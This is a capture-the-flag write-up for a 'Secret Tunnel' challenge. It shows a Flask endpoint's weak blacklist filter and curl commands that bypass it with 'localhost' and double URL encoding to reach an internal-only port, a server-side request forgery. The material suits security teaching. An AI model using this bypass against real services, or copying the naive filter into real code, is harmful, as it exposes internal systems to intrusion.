<h1> Secret Tunnel </h1>


<p> This server has two flask web servers, one on port 80 with which we can retrieve the first 32 characters of a web page and the other on port 1337 which displays the flag but which is only accessible locally.</p>

```bash
$ curl -X POST -d "url=https://nbctf.com/" https://secret-tunnel.chal.nbctf.com/fetchdata                                   
<!DOCTYPE html><html lang="en"><
```

```bash
$ curl -X POST -d "url=http://127.0.0.1:1337/flag" https://secret-tunnel.chal.nbctf.com/fetchdata
No loopback for you!
```

<p> We can see that the /fetchdata is vulnerable because we can bypass the basic filters to get the flag from the local web server on the 1337 port. </p>

```python
def fetchdata():
    url = request.form["url"]

    if "127" in url:
        return Response("No loopback for you!", mimetype="text/plain")
    if url.count('.') > 2:
        return Response("Only 2 dots allowed!", mimetype="text/plain")
    if "x" in url:
        return Response("I don't like twitter >:(" , mimetype="text/plain")
    if "flag" in url:
        return Response("It's not gonna be that easy :)", mimetype="text/plain")
```

<p> To bypass the filters we can replace 127.0.0.1 by localhost, and double URL encode "flag". And it's given the flag ! </p>

```bash
$ curl -X POST -d "url=http://localhost:1337/%2566%256c%2561%2567" https://secret-tunnel.chal.nbctf.com/fetchdata
nbctf{s3cr3t_7uNN3lllllllllll!}
```
